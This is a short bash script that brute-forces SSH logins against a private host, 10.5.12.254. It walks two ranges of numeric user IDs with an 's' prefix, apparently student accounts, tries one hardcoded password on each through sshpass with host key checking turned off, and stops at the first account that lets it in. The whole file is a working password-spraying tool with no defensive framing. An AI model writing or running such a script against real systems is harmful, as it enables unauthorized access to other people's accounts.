#!/bin/bash

HOST="10.5.12.254"
PASSWORD="gapwqbhz"
PORT=22

# User ID ranges
RANGE1_START=2022103031
RANGE1_END=2022103060
RANGE2_START=2022103541
RANGE2_END=2022103580

try_login() {
    echo "Trying user ID: s$1"
    sshpass -p $PASSWORD ssh -o StrictHostKeyChecking=no -p $PORT "s$1@$HOST" exit
    if [ $? -eq 0 ]; then
        echo "Successful login with user ID: s$1"
        exit 0
    fi
}

# Brute-force in the ranges
for user_id in $(seq $RANGE1_START $RANGE1_END) $(seq $RANGE2_START $RANGE2_END); do
    try_login $user_id
    sleep 4
done

echo "Brute-force attempt completed."
